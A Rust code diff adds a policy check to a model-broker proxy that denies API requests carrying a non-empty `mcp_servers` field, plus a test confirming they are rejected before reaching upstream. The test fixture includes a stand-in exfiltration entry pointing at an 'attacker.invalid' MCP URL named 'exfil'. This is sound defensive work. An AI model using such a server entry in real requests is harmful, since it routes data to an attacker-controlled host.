@@ -603,6 +603,14 @@ fn enforce_request_policy(
 	let mut value: serde_json::Value =
 		serde_json::from_slice(body).map_err(|_| RequestPolicyError::InvalidJson)?;
 	let object = value.as_object_mut().ok_or(RequestPolicyError::InvalidJson)?;
+	// The Messages API `mcp_servers` field makes the provider itself connect
+	// to caller-chosen URLs — the same capability class as the denied
+	// provider-side fetch tools, declared outside the `tools` array.
+	if object.get("mcp_servers").is_some_and(
+		|servers| !matches!(servers, serde_json::Value::Array(items) if items.is_empty()),
+	) {
+		return Err(RequestPolicyError::DeniedTool("mcp_servers".to_owned()));
+	}
 	if let Some(tools) = object.get("tools").and_then(serde_json::Value::as_array) {
 		for tool in tools {
 			if let Some(tool_type) = tool.get("type").and_then(serde_json::Value::as_str)
@@ -1352,6 +1360,28 @@ mod tests {
 			let captured = upstream.captured().await;
 			assert_eq!(captured.len(), 1);
 			assert_eq!(captured[0].body.as_ref(), allowed.as_bytes());
+			session.finish().await.unwrap();
+		}
+	}
+
+	#[tokio::test]
+	async fn mcp_servers_request_field_is_denied() {
+		for (backend, credential, path) in [
+			(claude_backend(), ModelCredential::anthropic_api_key("host-secret"), "/v1/messages"),
+			(codex_backend(), ModelCredential::openai_api_key("host-secret"), "/v1/responses"),
+		] {
+			let upstream = FakeUpstream::start("{}").await;
+			let session =
+				ModelBrokerSession::start(backend, upstream.url.clone(), credential, limits())
+					.await
+					.unwrap();
+			let mut client = connect(&session).await;
+			let denied = r#"{"model":"unused","mcp_servers":[{"type":"url","url":"https://attacker.invalid/mcp","name":"exfil"}]}"#;
+			let response = client.send_request(request(path, denied)).await.unwrap();
+			assert_eq!(response.status(), StatusCode::UNPROCESSABLE_ENTITY);
+			let body = response.into_body().collect().await.unwrap().to_bytes();
+			assert!(String::from_utf8_lossy(&body).contains("tool_policy_denied"));
+			assert!(upstream.captured().await.is_empty());
 			session.finish().await.unwrap();
 		}
 	}
